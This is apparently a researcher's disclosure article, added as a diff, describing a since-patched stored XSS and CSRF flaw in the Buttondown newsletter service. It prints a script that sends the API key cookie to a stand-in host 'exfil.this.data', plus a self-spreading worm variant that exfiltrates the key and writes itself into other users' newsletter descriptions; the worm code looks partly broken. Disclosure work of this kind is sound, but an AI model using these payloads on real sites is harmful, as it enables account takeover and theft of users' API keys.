@@ -1,0 +1,106 @@
+---
+pretext: Article
+title: Buttondown's XSS & CSRF Problem
+subtitle: Aug 2023
+
+inline: false
+---
+
+# Introduction
+
+In this article, I will walk you through a vulnerability I discovered in Buttondown, a popular email newsletter service. The vulnerability involves a combination of Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) attacks, which can potentially allow an attacker to gain unauthorized access to a user's account and perform actions on their behalf.
+
+
+===
+===
+
+## Understanding the Vulnerability
+
+The issue arises from the fact that the description box in the basic settings tab allows users to insert HTML without properly sanitizing the input. This means that malicious scripts can be injected into the description box. If a user who is logged into Buttondown views a newsletter containing such a script, their API key and other sensitive details stored in cookies can be exfiltrated.
+
+===
+===
+
+## Exploitation Scenario
+
+An attacker can craft a script to extract the API key from the cookies and send it to a remote server. Here is an example of such a script:
+
+When a logged-in user views a newsletter containing this script, their API key will be sent to the attacker's server. The attacker can then use this API key to perform actions on the user's behalf, such as sending newsletters, accessing subscriber lists, or modifying account settings.
+
+===
+
+```js
+<script>
+fetch(
+    'https://exfil.this.data/'
+    + document.cookie.match(/buttondown_newsletter_api_key=([^;]+)/)[1],
+    { mode: 'no-cors' }
+);
+</script>
+```
+
+===
+
+## Impact
+
+This vulnerability poses a serious risk to Buttondown users who are logged in and view newsletters containing malicious scripts. An attacker could potentially take over user accounts, access sensitive data, and perform unauthorized actions.
+
+===
+===
+
+## Self-Replicating Exploit
+
+One of the most concerning aspects of this vulnerability is its potential to become a self-replicating exploit, similar to the infamous MySpace Samy worm. The API allows users to add arbitrary data to the description of a blog post, which means that an attacker could inject a script that not only exfiltrates data but also propagates itself to other users.
+
+Here is an example of how such a script could look:
+
+===
+
+```html
+<script>
+// Extract the API key from the cookies
+const apiKey = document.cookie.match(/buttondown_newsletter_api_key=([^;]+)/)[1];
+
+const payload = `
+<script>
+const apiKey = document.cookie.match(/buttondown_newsletter_api_key=([^;]+)/)[1];
+fetch('https://exfil.this.data/' + apiKey, { mode: 'no-cors' });
+fetch('https://api.buttondown.email/v1/newsletters', {
+    method: 'POST',
+    headers: {
+        'Authorization': 'Token ' + apiKey,
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        description: '<script>'
+            + document.currentScript.innerHTML
+            + '</script>'
+    })
+});
+</script>
+`
+
+// Exfiltrate the API key to the attacker's server
+fetch('https://exfil.this.data/' + apiKey, { mode: 'no-cors' });
+
+// Propagate the exploit by adding
+// the malicious script to the target's description
+fetch('https://api.buttondown.email/v1/newsletters', {
+    method: 'POST',
+    headers: {
+        'Authorization': 'Token ' + apiKey,
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        description: ``
+    })
+});
+</script>
+```
+===
+===
+
+I reported this vulnerability through Buttondown's responsible disclosure program, and they have since patched the issue. They were quick, friendly and professional in their response, and I appreciate their commitment to security.
+
+===
+===
